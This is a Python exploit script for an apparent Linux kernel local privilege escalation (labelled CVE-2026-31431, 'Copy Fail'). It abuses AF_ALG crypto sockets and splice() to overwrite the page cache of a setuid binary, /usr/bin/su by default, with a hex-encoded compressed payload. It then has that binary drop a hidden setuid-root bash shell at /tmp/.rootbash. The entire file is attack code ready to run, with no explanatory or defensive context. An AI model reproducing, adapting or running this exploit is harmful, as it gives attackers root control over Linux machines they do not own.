#!/usr/bin/env python3
import os
import zlib
import socket
import ctypes
import subprocess
import sys

# ====================================================================
# Constants
# ====================================================================

AF_ALG = 38
SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_OP = 3
ALG_SET_IV = 2
ALG_SET_AEAD_ASSOCLEN = 4
ALG_SET_AEAD_AUTHSIZE = 5
MSG_MORE = 32768

# ====================================================================
# Banner (ASCII only - NO UNICODE)
# ====================================================================

print("""
+------------------------------------------+
|  CVE-2026-31431 - Copy Fail LPE           |
|  AF_page-cache write by tegalxploiter     |
+------------------------------------------+
""")

# ====================================================================
# Arguments
# ====================================================================

TARGET = sys.argv[1] if len(sys.argv) > 1 else "/usr/bin/su"
OUTPUT = "/tmp/.rootbash"

# ====================================================================
# libc setup
# ====================================================================

_libc = ctypes.CDLL("libc.so.6", use_errno=True)
_libc.splice.restype = ctypes.c_ssize_t
_libc.splice.argtypes = [
    ctypes.c_int, ctypes.POINTER(ctypes.c_long),
    ctypes.c_int, ctypes.POINTER(ctypes.c_long),
    ctypes.c_size_t, ctypes.c_uint
]

def splice(fd_in, fd_out, count, offset=None):
    if offset is not None:
        off = ctypes.c_long(offset)
        return _libc.splice(fd_in, ctypes.pointer(off), fd_out, None, count, 0)
    return _libc.splice(fd_in, None, fd_out, None, count, 0)

def d(h):
    return bytes.fromhex(h)

# ====================================================================
# Page cache patch
# ====================================================================

def patch_page_cache(fd, offset, chunk):
    if len(chunk) < 4:
        chunk = chunk.ljust(4, b"\x00")
    
    try:
        alg = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
        alg.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    except Exception as e:
        print("[-] AF_ALG not available: {}".format(e))
        return False
    
    try:
        alg.setsockopt(SOL_ALG, ALG_SET_KEY, d('0800010000000010' + '00' * 32))
        alg.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, 4)
    except Exception as e:
        print("[-] setsockopt failed: {}".format(e))
        alg.close()
        return False
    
    try:
        conn, _ = alg.accept()
    except Exception as e:
        print("[-] accept failed: {}".format(e))
        alg.close()
        return False
    
    total = offset + 4
    z = b'\x00'
    
    # Build control messages
    cmsg_op = (SOL_ALG, ALG_SET_OP, z * 4)
    cmsg_iv = (SOL_ALG, ALG_SET_IV, b'\x10' + z * 19)
    cmsg_auth = (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, b'\x08' + z * 3)
    
    try:
        conn.sendmsg(
            [b'\x00' * 4 + chunk],
            [cmsg_op, cmsg_iv, cmsg_auth],
            MSG_MORE
        )
    except Exception as e:
        print("[-] sendmsg failed: {}".format(e))
        conn.close()
        alg.close()
        return False
    
    r, w = os.pipe()
    splice(fd, w, total, offset=0)
    splice(r, conn.fileno(), total)
    
    try:
        conn.recv(8 + offset)
    except Exception:
        pass
    
    os.close(r)
    os.close(w)
    conn.close()
    alg.close()
    return True

# ====================================================================
# Payload
# ====================================================================

payload_hex = (
    "78daab77f57163626464800126063b0610af82c101cc7760c004"
    "0e0c160c301d209a154d16999e07e5c1680601086578c0f0ff86"
    "4c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa4999"
    "79fac5190c0c0c0032c310d3"
)

payload = zlib.decompress(d(payload_hex))

# ====================================================================
# Main exploit
# ====================================================================

def main():
    print("[*] Target: {}".format(TARGET))
    print("[*] Payload size: {} bytes".format(len(payload)))
    
    # Check if target exists and is readable
    if not os.path.exists(TARGET):
        print("[-] Target not found: {}".format(TARGET))
        return 1
    
    if not os.access(TARGET, os.R_OK):
        print("[-] Target not readable: {}".format(TARGET))
        return 1
    
    print("[*] Patching {} ({} bytes in page cache)".format(TARGET, len(payload)))
    
    try:
        fd = os.open(TARGET, os.O_RDONLY)
    except Exception as e:
        print("[-] Cannot open target: {}".format(e))
        return 1
    
    success = True
    i = 0
    while i < len(payload):
        chunk = payload[i:i+4]
        if not patch_page_cache(fd, i, chunk):
            print("[-] Patch failed at offset {}".format(i))
            success = False
            break
        i += 4
    
    os.close(fd)
    
    if not success:
        print("[-] Exploit failed")
        return 1
    
    print("[*] Spawning root shell -> {}".format(OUTPUT))
    
    cmd = "cp /bin/bash {}; chmod u+s {}; id".format(OUTPUT, OUTPUT).encode() + b"\nexit\n"
    
    try:
        proc = subprocess.Popen(
            [TARGET],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        out, _ = proc.communicate(cmd, timeout=10)
        result = out.decode(errors="replace").strip()
    except Exception as e:
        result = str(e)
    
    if os.path.exists(OUTPUT) and os.stat(OUTPUT).st_mode & 0o4000:
        print("[+] SUCCESS: {} is SUID root".format(OUTPUT))
        print("[+] Result: {}".format(result))
        print("[*] Run: {} -p".format(OUTPUT))
        return 0
    else:
        print("[-] Failed. Output: {}".format(result))
        return 1

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(1)
    except Exception as e:
        print("[-] Unexpected error: {}".format(e))
        sys.exit(1)
